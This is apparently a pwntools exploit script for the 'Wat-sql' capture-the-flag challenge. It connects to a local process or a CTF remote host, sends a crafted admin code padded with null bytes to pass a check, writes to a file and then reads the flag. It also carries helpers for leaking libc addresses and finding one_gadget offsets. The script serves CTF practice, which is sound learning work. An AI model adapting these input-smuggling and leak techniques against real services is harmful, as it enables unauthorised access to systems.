# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './Wat-sql'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'redirect.do-not-trust.hacking.run'
    port = '10196'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Query: ',num)

def query(name , num):
    cmd('read')
    sla('from: ' , name)
    sla('read: ' , num)

def update(name , text):
    cmd('write')
    sla('to:' , name)
    sla('to:' , 0)
    sla('write: ' , text)

# one_gad = one_gadget(libc.path)

def attack():
    
    # dbg('*0x00000000004012F1')
    sla('code:' , 'watevr-sql2019-demo-code-admin\x00\x00sey')
    
    update('database.txt' , 'aaa')
    query('flag' , 0)


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   Wat-sql.py
@Time    :   2022/01/21 20:57:09
@Author  :   Niyah 
'''